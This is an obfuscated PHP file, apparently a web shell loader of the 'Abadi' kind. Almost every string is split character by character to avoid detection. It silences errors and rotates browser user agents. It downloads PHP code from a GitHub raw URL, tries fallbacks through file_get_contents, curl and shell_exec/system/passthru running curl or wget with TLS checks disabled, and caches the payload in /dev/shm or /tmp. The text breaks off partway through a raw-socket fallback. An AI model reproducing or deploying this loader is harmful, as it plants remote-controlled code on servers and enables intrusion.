<?php
@error_reporting(0);
@ini_set('d'.'i'.'s'.'p'.'l'.'a'.'y'.'_'.'e'.'r'.'r'.'o'.'r'.'s', '0');
@ini_set('a'.'l'.'l'.'o'.'w'.'_'.'u'.'r'.'l'.'_'.'f'.'o'.'p'.'e'.'n', '1');
if (function_exists('s'.'e'.'t'.'_'.'t'.'i'.'m'.'e'.'_'.'l'.'i'.'m'.'i'.'t')) @set_time_limit(120);
@ini_set('m'.'a'.'x'.'_'.'e'.'x'.'e'.'c'.'u'.'t'.'i'.'o'.'n'.'_'.'t'.'i'.'m'.'e', '1'.'2'.'0');
@ini_set('m'.'e'.'m'.'o'.'r'.'y'.'_'.'l'.'i'.'m'.'i'.'t', '5'.'1'.'2'.'M');

if (!headers_sent()) {
    @header('X'.'-'.'L'.'i'.'t'.'e'.'S'.'p'.'e'.'e'.'d'.'-'.'C'.'a'.'c'.'h'.'e'.'-'.'C'.'o'.'n'.'t'.'r'.'o'.'l'.':'.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e'.','.' '.'n'.'o'.'-'.'s'.'t'.'o'.'r'.'e'.','.' '.'m'.'u'.'s'.'t'.'-'.'r'.'e'.'v'.'a'.'l'.'i'.'d'.'a'.'t'.'e');
    @header('C'.'a'.'c'.'h'.'e'.'-'.'C'.'o'.'n'.'t'.'r'.'o'.'l'.':'.' '.'n'.'o'.'-'.'s'.'t'.'o'.'r'.'e'.','.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e'.','.' '.'m'.'u'.'s'.'t'.'-'.'r'.'e'.'v'.'a'.'l'.'i'.'d'.'a'.'t'.'e'.','.' '.'m'.'a'.'x'.'-'.'a'.'g'.'e'.'='.'0');
    @header('P'.'r'.'a'.'g'.'m'.'a'.':'.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e');
}

define('A'.'B'.'A'.'D'.'I'.'_'.'U'.'R'.'L', 'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m'.'/'.'B'.'l'.'a'.'c'.'k'.'N'.'o'.'v'.'a'.'H'.'u'.'b'.'/'.'A'.'b'.'a'.'d'.'i'.'N'.'a'.'n'.'J'.'a'.'y'.'a'.'/'.'r'.'e'.'f'.'s'.'/'.'h'.'e'.'a'.'d'.'s'.'/'.'m'.'a'.'i'.'n'.'/'.'i'.'n'.'d'.'e'.'x'.'.'.'p'.'h'.'p');
define('A'.'B'.'A'.'D'.'I'.'_'.'T'.'T'.'L', 300);

/**
 * Cache HANYA di luar webroot:
 *   /dev/shm/abadi_data  (RAM, prioritas)
 *   /tmp/abadi_data
 *   sys_get_temp_dir()/abadi_data  (Windows / fallback)
 * Tidak pernah menulis .abadi_ls_cache.php di folder site.
 */
function abadi_cache_dir() {
    static $dir = null;
    if ($dir !== null) return $dir;
    $name = 'a'.'b'.'a'.'d'.'i'.'_'.'d'.'a'.'t'.'a';
    $cands = array(
        '/'.'d'.'e'.'v'.'/'.'s'.'h'.'m'.'/' . $name,
        '/'.'t'.'m'.'p'.'/' . $name,
    );
    if (function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
        $sys = @sys_get_temp_dir();
        if (is_string($sys) && $sys !== '') {
            $cands[] = rtrim($sys, "\\/") . DIRECTORY_SEPARATOR . $name;
        }
    }
    foreach ($cands as $d) {
        if (!is_dir($d)) @mkdir($d, 0700, true);
        if (is_dir($d) && is_writable($d)) {
            $dir = $d;
            return $dir;
        }
        $parent = dirname($d);
        if (is_dir($parent) && is_writable($parent)) {
            @mkdir($d, 0700, true);
            if (is_dir($d) && is_writable($d)) {
                $dir = $d;
                return $dir;
            }
        }
    }
    $dir = '';
    return $dir;
}

function abadi_cache_file() {
    static $path = null;
    if ($path !== null) return $path;
    $d = abadi_cache_dir();
    if ($d === '') {
        $path = '';
        return $path;
    }
    $host = !empty($_SERVER['H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T']) ? (string) $_SERVER['H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T'] : 'c'.'l'.'i';
    $key = substr(md5(__FILE__ . '|' . $host), 0, 16);
    $path = $d . DIRECTORY_SEPARATOR . 'l'.'s'.'_' . $key . '.'.'p'.'h'.'p';
    return $path;
}

/** Hapus sisa cache lama di webroot (versi sebelumnya) */
function abadi_purge_webroot_cache() {
    $old = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'l'.'s'.'_'.'c'.'a'.'c'.'h'.'e'.'.'.'p'.'h'.'p';
    if (is_file($old)) @unlink($old);
    $old2 = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'f'.'e'.'t'.'c'.'h'.'_';
    // biarkan; fetch tmp diganti ke temp dir
}

abadi_purge_webroot_cache();

function abadi_ua() {
    static $list = array(
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'W'.'i'.'n'.'d'.'o'.'w'.'s'.' '.'N'.'T'.' '.'1'.'0'.'.'.'0'.';'.' '.'W'.'i'.'n'.'6'.'4'.';'.' '.'x'.'6'.'4'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'C'.'h'.'r'.'o'.'m'.'e'.'/'.'1'.'2'.'2'.'.'.'0'.'.'.'0'.'.'.'0'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'5'.'3'.'7'.'.'.'3'.'6',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'W'.'i'.'n'.'d'.'o'.'w'.'s'.' '.'N'.'T'.' '.'1'.'0'.'.'.'0'.';'.' '.'W'.'i'.'n'.'6'.'4'.';'.' '.'x'.'6'.'4'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'C'.'h'.'r'.'o'.'m'.'e'.'/'.'1'.'2'.'1'.'.'.'0'.'.'.'0'.'.'.'0'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'E'.'d'.'g'.'/'.'1'.'2'.'1'.'.'.'0'.'.'.'0'.'.'.'0',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'W'.'i'.'n'.'d'.'o'.'w'.'s'.' '.'N'.'T'.' '.'1'.'0'.'.'.'0'.';'.' '.'W'.'i'.'n'.'6'.'4'.';'.' '.'x'.'6'.'4'.';'.' '.'r'.'v'.':'.'1'.'2'.'2'.'.'.'0'.')'.' '.'G'.'e'.'c'.'k'.'o'.'/'.'2'.'0'.'1'.'0'.'0'.'1'.'0'.'1'.' '.'F'.'i'.'r'.'e'.'f'.'o'.'x'.'/'.'1'.'2'.'2'.'.'.'0',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'M'.'a'.'c'.'i'.'n'.'t'.'o'.'s'.'h'.';'.' '.'I'.'n'.'t'.'e'.'l'.' '.'M'.'a'.'c'.' '.'O'.'S'.' '.'X'.' '.'1'.'3'.'_'.'6'.'_'.'3'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'6'.'0'.'5'.'.'.'1'.'.'.'1'.'5'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'V'.'e'.'r'.'s'.'i'.'o'.'n'.'/'.'1'.'7'.'.'.'2'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'6'.'0'.'5'.'.'.'1'.'.'.'1'.'5',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'X'.'1'.'1'.';'.' '.'L'.'i'.'n'.'u'.'x'.' '.'x'.'8'.'6'.'_'.'6'.'4'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'C'.'h'.'r'.'o'.'m'.'e'.'/'.'1'.'2'.'2'.'.'.'0'.'.'.'0'.'.'.'0'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'5'.'3'.'7'.'.'.'3'.'6',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'i'.'P'.'h'.'o'.'n'.'e'.';'.' '.'C'.'P'.'U'.' '.'i'.'P'.'h'.'o'.'n'.'e'.' '.'O'.'S'.' '.'1'.'7'.'_'.'3'.' '.'l'.'i'.'k'.'e'.' '.'M'.'a'.'c'.' '.'O'.'S'.' '.'X'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'6'.'0'.'5'.'.'.'1'.'.'.'1'.'5'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'V'.'e'.'r'.'s'.'i'.'o'.'n'.'/'.'1'.'7'.'.'.'2'.' '.'M'.'o'.'b'.'i'.'l'.'e'.'/'.'1'.'5'.'E'.'1'.'4'.'8'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'6'.'0'.'4'.'.'.'1',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'L'.'i'.'n'.'u'.'x'.';'.' '.'A'.'n'.'d'.'r'.'o'.'i'.'d'.' '.'1'.'4'.';'.' '.'P'.'i'.'x'.'e'.'l'.' '.'8'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'C'.'h'.'r'.'o'.'m'.'e'.'/'.'1'.'2'.'2'.'.'.'0'.'.'.'0'.'.'.'0'.' '.'M'.'o'.'b'.'i'.'l'.'e'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'5'.'3'.'7'.'.'.'3'.'6',
        'M'.'o'.'z'.'i'.'l'.'l'.'a'.'/'.'5'.'.'.'0'.' '.'('.'W'.'i'.'n'.'d'.'o'.'w'.'s'.' '.'N'.'T'.' '.'1'.'0'.'.'.'0'.';'.' '.'W'.'i'.'n'.'6'.'4'.';'.' '.'x'.'6'.'4'.')'.' '.'A'.'p'.'p'.'l'.'e'.'W'.'e'.'b'.'K'.'i'.'t'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'('.'K'.'H'.'T'.'M'.'L'.','.' '.'l'.'i'.'k'.'e'.' '.'G'.'e'.'c'.'k'.'o'.')'.' '.'C'.'h'.'r'.'o'.'m'.'e'.'/'.'1'.'2'.'0'.'.'.'0'.'.'.'0'.'.'.'0'.' '.'S'.'a'.'f'.'a'.'r'.'i'.'/'.'5'.'3'.'7'.'.'.'3'.'6'.' '.'O'.'P'.'R'.'/'.'1'.'0'.'6'.'.'.'0'.'.'.'0'.'.'.'0',
    );
    return $list[mt_rand(0, count($list) - 1)];
}

function abadi_fn_ok($fn) {
    if (!function_exists($fn)) return false;
    $d = strtolower((string) @ini_get('d'.'i'.'s'.'a'.'b'.'l'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'s'));
    if ($d === '') return true;
    $arr = array_map('t'.'r'.'i'.'m', explode(',', $d));
    return !in_array(strtolower($fn), $arr, true);
}

function abadi_ok_body($b) {
    return is_string($b) && strlen($b) > 80 && (strpos($b, '<'.'?'.'p'.'h'.'p') !== false || strpos($b, 'F'.'M'.'_') !== false || strpos($b, 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.' ') !== false);
}

function abadi_http_headers($ua) {
    return array(
        'U'.'s'.'e'.'r'.'-'.'A'.'g'.'e'.'n'.'t'.':'.' ' . $ua,
        'A'.'c'.'c'.'e'.'p'.'t'.':'.' '.'t'.'e'.'x'.'t'.'/'.'h'.'t'.'m'.'l'.','.'a'.'p'.'p'.'l'.'i'.'c'.'a'.'t'.'i'.'o'.'n'.'/'.'x'.'h'.'t'.'m'.'l'.'+'.'x'.'m'.'l'.','.'a'.'p'.'p'.'l'.'i'.'c'.'a'.'t'.'i'.'o'.'n'.'/'.'x'.'m'.'l'.';'.'q'.'='.'0'.'.'.'9'.','.'i'.'m'.'a'.'g'.'e'.'/'.'a'.'v'.'i'.'f'.','.'i'.'m'.'a'.'g'.'e'.'/'.'w'.'e'.'b'.'p'.','.'*'.'/'.'*'.';'.'q'.'='.'0'.'.'.'8',
        'A'.'c'.'c'.'e'.'p'.'t'.'-'.'L'.'a'.'n'.'g'.'u'.'a'.'g'.'e'.':'.' '.'e'.'n'.'-'.'U'.'S'.','.'e'.'n'.';'.'q'.'='.'0'.'.'.'9'.','.'i'.'d'.';'.'q'.'='.'0'.'.'.'8',
        'A'.'c'.'c'.'e'.'p'.'t'.'-'.'E'.'n'.'c'.'o'.'d'.'i'.'n'.'g'.':'.' '.'i'.'d'.'e'.'n'.'t'.'i'.'t'.'y',
        'C'.'a'.'c'.'h'.'e'.'-'.'C'.'o'.'n'.'t'.'r'.'o'.'l'.':'.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e',
        'P'.'r'.'a'.'g'.'m'.'a'.':'.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e',
        'U'.'p'.'g'.'r'.'a'.'d'.'e'.'-'.'I'.'n'.'s'.'e'.'c'.'u'.'r'.'e'.'-'.'R'.'e'.'q'.'u'.'e'.'s'.'t'.'s'.':'.' '.'1',
        'S'.'e'.'c'.'-'.'F'.'e'.'t'.'c'.'h'.'-'.'D'.'e'.'s'.'t'.':'.' '.'d'.'o'.'c'.'u'.'m'.'e'.'n'.'t',
        'S'.'e'.'c'.'-'.'F'.'e'.'t'.'c'.'h'.'-'.'M'.'o'.'d'.'e'.':'.' '.'n'.'a'.'v'.'i'.'g'.'a'.'t'.'e',
        'S'.'e'.'c'.'-'.'F'.'e'.'t'.'c'.'h'.'-'.'S'.'i'.'t'.'e'.':'.' '.'n'.'o'.'n'.'e',
        'S'.'e'.'c'.'-'.'F'.'e'.'t'.'c'.'h'.'-'.'U'.'s'.'e'.'r'.':'.' '.'?'.'1',
        'C'.'o'.'n'.'n'.'e'.'c'.'t'.'i'.'o'.'n'.':'.' '.'c'.'l'.'o'.'s'.'e',
    );
}

function abadi_decode_chunked($str) {
    $out = '';
    while ($str !== '') {
        $p = strpos($str, "\r\n");
        if ($p === false) break;
        $n = hexdec(trim(substr($str, 0, $p)));
        if ($n <= 0) break;
        $out .= substr($str, $p + 2, $n);
        $str = substr($str, $p + 2 + $n + 2);
    }
    return $out;
}

function abadi_parse_http($raw) {
    $pos = strpos($raw, "\r\n\r\n");
    if ($pos === false) {
        $pos = strpos($raw, "\n\n");
        if ($pos === false) return array(0, '', $raw);
        $head = substr($raw, 0, $pos);
        $body = substr($raw, $pos + 2);
    } else {
        $head = substr($raw, 0, $pos);
        $body = substr($raw, $pos + 4);
    }
    $code = 0;
    if (preg_match('#'.'H'.'T'.'T'.'P'.'/'.'\\'.'S'.'+'.'\\'.'s'.'+'.'('.'\\'.'d'.'+'.')'.'#'.'i', $head, $m)) $code = (int) $m[1];
    if (stripos($head, 'T'.'r'.'a'.'n'.'s'.'f'.'e'.'r'.'-'.'E'.'n'.'c'.'o'.'d'.'i'.'n'.'g'.':'.' '.'c'.'h'.'u'.'n'.'k'.'e'.'d') !== false) {
        $body = abadi_decode_chunked($body);
    }
    return array($code, $head, $body);
}

function abadi_fetch($url) {
    $ua = abadi_ua();
    $hdrs = abadi_http_headers($ua);
    $hdrLine = implode("\r\n", $hdrs) . "\r\n";
    $tried = array();

    if (abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        $tried[] = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
        $ctx = stream_context_create(array(
            'h'.'t'.'t'.'p' => array(
                'm'.'e'.'t'.'h'.'o'.'d' => 'G'.'E'.'T',
                'h'.'e'.'a'.'d'.'e'.'r' => $hdrLine,
                't'.'i'.'m'.'e'.'o'.'u'.'t' => 45,
                'f'.'o'.'l'.'l'.'o'.'w'.'_'.'l'.'o'.'c'.'a'.'t'.'i'.'o'.'n' => 1,
                'm'.'a'.'x'.'_'.'r'.'e'.'d'.'i'.'r'.'e'.'c'.'t'.'s' => 5,
                'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true,
            ),
            's'.'s'.'l' => array(
                'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false,
                'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false,
                'a'.'l'.'l'.'o'.'w'.'_'.'s'.'e'.'l'.'f'.'_'.'s'.'i'.'g'.'n'.'e'.'d' => true,
            ),
        ));
        $b = @file_get_contents($url, false, $ctx);
        if (abadi_ok_body($b)) return array(true, $b, 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s', $tried);
    }

    if (abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        $tried[] = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s'.'#'.'2';
        $ua2 = abadi_ua();
        $ctx = stream_context_create(array(
            'h'.'t'.'t'.'p' => array(
                'm'.'e'.'t'.'h'.'o'.'d' => 'G'.'E'.'T',
                'h'.'e'.'a'.'d'.'e'.'r' => "User-Agent: $ua2\r\nAccept: */*\r\nConnection: close\r\n",
                't'.'i'.'m'.'e'.'o'.'u'.'t' => 40,
                'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true,
            ),
            's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
        ));
        $b = @file_get_contents($url, false, $ctx);
        if (abadi_ok_body($b)) return array(true, $b, 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s'.'#'.'2', $tried);
    }

    if (abadi_fn_ok('f'.'o'.'p'.'e'.'n') && abadi_fn_ok('s'.'t'.'r'.'e'.'a'.'m'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
        $tried[] = 'f'.'o'.'p'.'e'.'n';
        $ctx = stream_context_create(array(
            'h'.'t'.'t'.'p' => array('m'.'e'.'t'.'h'.'o'.'d' => 'G'.'E'.'T', 'h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 40, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
            's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
        ));
        $fp = @fopen($url, 'r'.'b', false, $ctx);
        if (is_resource($fp)) {
            $b = @stream_get_contents($fp);
            @fclose($fp);
            if (abadi_ok_body($b)) return array(true, $b, 'f'.'o'.'p'.'e'.'n', $tried);
        }
    }

    if (abadi_fn_ok('c'.'u'.'r'.'l'.'_'.'i'.'n'.'i'.'t') && abadi_fn_ok('c'.'u'.'r'.'l'.'_'.'e'.'x'.'e'.'c')) {
        $tried[] = 'c'.'u'.'r'.'l';
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 8);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $hdrs);
        curl_setopt($ch, CURLOPT_ENCODING, '');
        if (defined('C'.'U'.'R'.'L'.'P'.'R'.'O'.'T'.'O'.'_'.'H'.'T'.'T'.'P'.'S')) {
            @curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
        }
        $b = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if (abadi_ok_body($b) && ($code === 0 || ($code >= 200 && $code < 400))) {
            return array(true, $b, 'c'.'u'.'r'.'l', $tried);
        }
    }

    if (abadi_fn_ok('c'.'u'.'r'.'l'.'_'.'i'.'n'.'i'.'t') && abadi_fn_ok('c'.'u'.'r'.'l'.'_'.'e'.'x'.'e'.'c')) {
        $tried[] = 'c'.'u'.'r'.'l'.'#'.'h'.'t'.'t'.'p'.'1'.'1';
        $ua2 = abadi_ua();
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua2);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'A'.'c'.'c'.'e'.'p'.'t'.':'.' '.'t'.'e'.'x'.'t'.'/'.'h'.'t'.'m'.'l'.','.'a'.'p'.'p'.'l'.'i'.'c'.'a'.'t'.'i'.'o'.'n'.'/'.'x'.'h'.'t'.'m'.'l'.'+'.'x'.'m'.'l'.','.'a'.'p'.'p'.'l'.'i'.'c'.'a'.'t'.'i'.'o'.'n'.'/'.'x'.'m'.'l'.';'.'q'.'='.'0'.'.'.'9'.','.'*'.'/'.'*'.';'.'q'.'='.'0'.'.'.'8',
            'A'.'c'.'c'.'e'.'p'.'t'.'-'.'L'.'a'.'n'.'g'.'u'.'a'.'g'.'e'.':'.' '.'e'.'n'.'-'.'U'.'S'.','.'e'.'n'.';'.'q'.'='.'0'.'.'.'9',
            'C'.'a'.'c'.'h'.'e'.'-'.'C'.'o'.'n'.'t'.'r'.'o'.'l'.':'.' '.'n'.'o'.'-'.'c'.'a'.'c'.'h'.'e',
            'C'.'o'.'n'.'n'.'e'.'c'.'t'.'i'.'o'.'n'.':'.' '.'c'.'l'.'o'.'s'.'e',
        ));
        $b = curl_exec($ch);
        curl_close($ch);
        if (abadi_ok_body($b)) return array(true, $b, 'c'.'u'.'r'.'l'.'#'.'h'.'t'.'t'.'p'.'1'.'1', $tried);
    }

    $curlBins = array('c'.'u'.'r'.'l', '/'.'u'.'s'.'r'.'/'.'b'.'i'.'n'.'/'.'c'.'u'.'r'.'l', '/'.'b'.'i'.'n'.'/'.'c'.'u'.'r'.'l', 'c'.'u'.'r'.'l'.'.'.'e'.'x'.'e');
    foreach (array('s'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c', 'e'.'x'.'e'.'c', 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u', 's'.'y'.'s'.'t'.'e'.'m', 'p'.'o'.'p'.'e'.'n') as $runner) {
        if (!abadi_fn_ok($runner)) continue;
        foreach ($curlBins as $bin) {
            $tried[] = $runner . ':' . $bin;
            $ua2 = abadi_ua();
            $cmd = $bin . ' '.'-'.'s'.'L'.' '.'-'.'-'.'m'.'a'.'x'.'-'.'t'.'i'.'m'.'e'.' '.'4'.'5'.' '.'-'.'A'.' ' . escapeshellarg($ua2)
                . ' '.'-'.'H'.' ' . escapeshellarg('A'.'c'.'c'.'e'.'p'.'t'.':'.' '.'t'.'e'.'x'.'t'.'/'.'h'.'t'.'m'.'l'.','.'a'.'p'.'p'.'l'.'i'.'c'.'a'.'t'.'i'.'o'.'n'.'/'.'x'.'h'.'t'.'m'.'l'.'+'.'x'.'m'.'l'.','.'*'.'/'.'*'.';'.'q'.'='.'0'.'.'.'8')
                . ' '.'-'.'H'.' ' . escapeshellarg('A'.'c'.'c'.'e'.'p'.'t'.'-'.'L'.'a'.'n'.'g'.'u'.'a'.'g'.'e'.':'.' '.'e'.'n'.'-'.'U'.'S'.','.'e'.'n'.';'.'q'.'='.'0'.'.'.'9')
                . ' ' . escapeshellarg($url);
            $b = false;
            if ($runner === 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c') {
                $b = @shell_exec($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l');
            } elseif ($runner === 'e'.'x'.'e'.'c') {
                $lines = array();
                @exec($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l', $lines);
                $b = implode("\n", $lines);
            } elseif ($runner === 'p'.'o'.'p'.'e'.'n' && abadi_fn_ok('p'.'c'.'l'.'o'.'s'.'e')) {
                $h = @popen($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l', 'r');
                if (is_resource($h)) {
                    $b = @stream_get_contents($h);
                    @pclose($h);
                }
            } else {
                ob_start();
                if ($runner === 's'.'y'.'s'.'t'.'e'.'m') @system($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l');
                else @passthru($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l');
                $b = ob_get_clean();
            }
            if (abadi_ok_body($b)) return array(true, $b, $runner . ':' . $bin, $tried);
        }
        break;
    }

    foreach (array('s'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c', 'e'.'x'.'e'.'c') as $runner) {
        if (!abadi_fn_ok($runner)) continue;
        $tried[] = $runner . ':'.'w'.'g'.'e'.'t';
        $ua2 = abadi_ua();
        $cmd = 'w'.'g'.'e'.'t'.' '.'-'.'q'.' '.'-'.'O'.' '.'-'.' '.'-'.'-'.'t'.'i'.'m'.'e'.'o'.'u'.'t'.'='.'4'.'5'.' '.'-'.'-'.'u'.'s'.'e'.'r'.'-'.'a'.'g'.'e'.'n'.'t'.'=' . escapeshellarg($ua2) . ' ' . escapeshellarg($url);
        if ($runner === 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c') $b = @shell_exec($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l');
        else {
            $lines = array();
            @exec($cmd . ' '.'2'.'>'.'/'.'d'.'e'.'v'.'/'.'n'.'u'.'l'.'l', $lines);
            $b = implode("\n", $lines);
        }
        if (abadi_ok_body($b)) return array(true, $b, $runner . ':'.'w'.'g'.'e'.'t', $tried);
        break;
    }

    $p = @parse_url($url);
    if (is_array($p) && !empty($p['h'.'o'.'s'.'t'])) {
        $host = $p['h'.'o'.'s'.'t'];
        $path = isset($p['p'.'a'.'t'.'h']) ? $p['p'.'a'.'t'.'h'] : '/';
        if (!empty($p['q'.'u'.'e'.'r'.'y'])) $path .= '?' . $p['q'.'u'.'e'.'r'.'y'];
        $ssl = (isset($p['s'.'c'.'h'.'e'.'m'.'e']) && strtolower($p['s'.'c'.'h'.'e'.'m'.'e']) === 'h'.'t'.'t'.'p'.'s');
        $port = isset($p['p'.'o'.'r'.'t']) ? (int) $p['p'.'o'.'r'.'t'] : ($ssl ? 443 : 80);
        $ua2 = abadi_ua();
        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua2\r\n"
            . "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            . "Accept-Language: en-US,en;q=0.9\r\n"
            . "Accept-Encoding: identity\r\n"
            . "Connection: close\r\n"
            . "Upgrade-Insecure-Requests: 1\r\n\r\n";

        $fp = false;
